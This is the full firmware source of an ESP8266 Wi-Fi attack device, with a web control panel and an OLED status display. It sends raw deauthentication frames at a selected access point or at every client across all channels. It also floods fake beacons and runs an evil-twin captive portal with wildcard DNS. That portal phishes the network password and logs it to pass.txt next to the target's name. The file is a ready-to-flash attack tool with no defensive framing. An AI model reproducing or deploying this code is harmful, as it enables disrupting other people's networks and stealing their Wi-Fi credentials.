#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <FS.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

extern "C" {
  #include "user_interface.h"
}

// OLED Config 0.66" (64x48)
Adafruit_SSD1306 display(64, 48, &Wire, -1);

ESP8266WebServer server(80);
DNSServer dnsServer;
File fsUploadFile; 

// --- GLOBAL SETTINGS ---
String adminSSID = "ADMIN_DASHBOARD";
String adminPW = "password123";
String activePortal = "/etwin1.html";
bool isMassKill = false, isDeauth = false, isSpam = false, isEvil = false, hiddenAdmin = false;

String targetBSSID = "";
int targetCh = 1;
String targetSSID = "";
int currentCh = 1;

// Template Paket Deauth
uint8_t deauthPkt[26] = {
  0xC0, 0x00, 0x00, 0x00, 
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Source (AP)
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID
  0x00, 0x00, 0x01, 0x00
};

// --- HELPER: PARSE MAC ADDRESS ---
void parseBytes(const char* str, char sep, uint8_t* bytes, int maxBytes, int base) {
    for (int i = 0; i < maxBytes; i++) {
        bytes[i] = strtoul(str, NULL, base);
        str = strchr(str, sep);
        if (str == NULL || *str == '\0') break;
        str++;
    }
}

// --- CORE: BEACON SPAM ENGINE ---
void sendBeacon(String ssid) {
  uint8_t packet[128] = {
    0x80, 0x00, 0x00, 0x00, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Random Source
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x64, 0x00, 0x31, 0x00, 0x00, (uint8_t)ssid.length()
  };
  int pos = 38;
  for (int i = 0; i < ssid.length(); i++) packet[pos++] = ssid[i];
  uint8_t post[] = { 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, (uint8_t)WiFi.channel() };
  for (int i = 0; i < sizeof(post); i++) packet[pos++] = post[i];
  wifi_send_pkt_freedom(packet, pos, 0);
}

// --- WEB HANDLERS ---
void handleRoot() {
  if (WiFi.softAPIP() == server.client().localIP()) {
    File f = SPIFFS.open("/index.html", "r");
    if(!f) server.send(200, "text/plain", "Upload index.html first!");
    else { server.streamFile(f, "text/html"); f.close(); }
  } else {
    File f = SPIFFS.open(activePortal, "r");
    if(!f) server.send(200, "text/html", "<h1>System Maintenance</h1>");
    else { server.streamFile(f, "text/html"); f.close(); }
  }
}

void handleScan() {
  int n = WiFi.scanNetworks(false, true);
  String json = "[";
  for (int i = 0; i < n; i++) {
    json += "{\"s\":\""+WiFi.SSID(i)+"\",\"c\":"+String(WiFi.channel(i))+",\"r\":"+String(WiFi.RSSI(i))+",\"b\":\""+WiFi.BSSIDstr(i)+"\"}";
    if (i < n - 1) json += ",";
  }
  json += "]";
  server.send(200, "application/json", json);
}

void handleToggle() {
  String mode = server.arg("m");
  if (mode == "kill") isMassKill = !isMassKill;
  if (mode == "deauth") isDeauth = !isDeauth;
  if (mode == "spam") isSpam = !isSpam;
  if (mode == "evil") isEvil = !isEvil;
  server.send(200, "text/plain", "OK");
}

void handleSelect() {
  targetBSSID = server.arg("b");
  targetCh = server.arg("c").toInt();
  targetSSID = server.arg("s");
  parseBytes(targetBSSID.c_str(), ':', &deauthPkt[10], 6, 16); 
  parseBytes(targetBSSID.c_str(), ':', &deauthPkt[16], 6, 16); 
  server.send(200, "text/plain", "Target Locked");
}

// --- SETUP ---
void setup() {
  Serial.begin(115200);
  SPIFFS.begin();
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(adminSSID.c_str(), adminPW.c_str(), 1, hiddenAdmin);
  
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/", HTTP_GET, handleRoot);
  server.on("/scan", HTTP_GET, handleScan);
  server.on("/toggle", HTTP_GET, handleToggle);
  server.on("/select", HTTP_GET, handleSelect);
  server.on("/upload", HTTP_POST, [](){ server.send(200); }, [](){
    HTTPUpload& upload = server.upload();
    if(upload.status == UPLOAD_FILE_START) fsUploadFile = SPIFFS.open("/" + upload.filename, "w");
    else if(upload.status == UPLOAD_FILE_WRITE && fsUploadFile) fsUploadFile.write(upload.buf, upload.currentSize);
    else if(upload.status == UPLOAD_FILE_END && fsUploadFile) fsUploadFile.close();
  });
  
  server.on("/log", HTTP_POST, [](){
    File f = SPIFFS.open("/pass.txt", "a");
    f.println("Target: " + targetSSID + " | PW: " + server.arg("p"));
    f.close();
    server.send(200, "text/html", "Success");
  });

  server.begin();
  wifi_promiscuous_enable(1);
}

// --- LOOP UTAMA ---
void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  unsigned long now = millis();
  static unsigned long lastAtk = 0;

  if (now - lastAtk > 100) {
    lastAtk = now;

    if (isMassKill) {
      currentCh = (currentCh % 13) + 1;
      if (currentCh != WiFi.channel()) {
        wifi_set_channel(currentCh);
        uint8_t brc[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        memcpy(&deauthPkt[4], brc, 6); 
        for(int i=0; i<3; i++) wifi_send_pkt_freedom(deauthPkt, 26, 0);
      }
    } 
    else if (isDeauth && targetBSSID != "") {
      wifi_set_channel(targetCh);
      for(int i=0; i<10; i++) wifi_send_pkt_freedom(deauthPkt, 26, 0);
    }

    if (isSpam && targetSSID != "") {
      for(int i=0; i<3; i++) sendBeacon(targetSSID + " _FREE");
    }
  }

  static unsigned long lastOLED = 0;
  if (now - lastOLED > 1000) {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.setCursor(0,0);
    display.printf("KIL:%d DEA:%d\nSPM:%d EVL:%d\nTGT:%s", isMassKill, isDeauth, isSpam, isEvil, targetSSID.substring(0,8).c_str());
    display.display();
    lastOLED = now;
  }
}
